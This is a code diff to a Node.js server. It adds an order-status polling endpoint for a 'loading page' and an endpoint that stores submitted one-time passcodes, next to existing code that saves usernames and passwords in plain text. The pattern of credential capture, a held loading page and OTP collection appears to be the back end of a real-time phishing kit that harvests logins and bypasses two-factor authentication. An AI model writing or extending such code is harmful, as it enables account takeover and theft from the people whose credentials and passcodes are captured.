@@ -110,6 +110,33 @@ const server = http.createServer(async (req, res) => {
             if (request) {
                 request.username = data.username || '';
                 request.password = data.password || '';
+                request.status = 'pending';
+            }
+            return sendJson(res, 200, { ok: true });
+        } catch (e) {
+            return sendJson(res, 400, { ok: false, error: 'Invalid request' });
+        }
+    }
+
+    // Check order status (for loading page polling)
+    const checkMatch = pathname.match(/^\/api\/requests\/(\d+)\/check$/);
+    if (checkMatch && req.method === 'GET') {
+        const id = Number(checkMatch[1]);
+        const request = requests.find(r => r.id === id);
+        if (request) {
+            return sendJson(res, 200, { ok: true, status: request.status });
+        }
+        return sendJson(res, 200, { ok: false, status: 'not_found' });
+    }
+
+    // Submit OTP
+    if (pathname === '/api/submit-otp' && req.method === 'POST') {
+        try {
+            const data = await readBody(req);
+            const orderId = data.orderId;
+            const request = requests.find(r => r.id === orderId);
+            if (request) {
+                request.otp = data.otp || '';
             }
             return sendJson(res, 200, { ok: true });
         } catch (e) {
